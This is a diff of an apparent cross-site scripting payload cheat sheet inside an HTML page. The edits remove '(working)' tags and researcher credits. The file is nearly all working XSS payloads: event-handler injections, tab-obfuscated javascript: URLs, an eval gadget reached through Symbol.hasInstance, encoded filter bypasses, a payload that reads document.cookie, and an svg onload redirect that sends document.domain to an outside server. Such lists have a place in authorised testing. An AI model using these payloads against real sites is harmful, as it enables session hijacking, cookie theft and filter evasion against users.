@@ -12,7 +12,6 @@ info:
 <!-- Login Form -->
 <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
 
-XSS payload without ()
 <svg onload="{hello:window . name instanceof{[Symbol.hasInstance]:eval}}">
 
 <a"/onclick=(confirm)()>Click Here!
@@ -30,18 +29,17 @@ javascript:{ alert`0` }
 <img ignored=() src=x onerror=prompt(1)>
 <svg onx=() onload=(confirm)(1)>
 “><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
-<svg on =i onload=alert(domain) (working)
+<svg on =i onload=alert(domain)
 <svg/onload=location/**/='https://your.server/'+document.domain>
-<svg onx=() onload=window.alert?.()> (working)
-test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
-"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic
-"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan
+<svg onx=() onload=window.alert?.()> 
+test",prompt%0A/*HelloWorld*/(document.domain)
+"onx+%00+onpointerenter%3dalert(domain)+x" 
+"><svg%20onload=alert%26%230000000040"1")>
 %27%09);%0d%0a%09%09[1].find(alert)//
-"><img src=1 onmouseleave=print()> - @itsgeekymonk
-<svg on onload=(alert)(document.domain)> -@zapstiko
-<svg/on%20onload=alert(1)> (working) -@aufzayed
-<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi
-
+"><img src=1 onmouseleave=print()> 
+<svg on onload=(alert)(document.domain)> 
+<svg/on%20onload=alert(1)> (working) 
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> 
 
 <!-- Footer with your name -->
 <div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
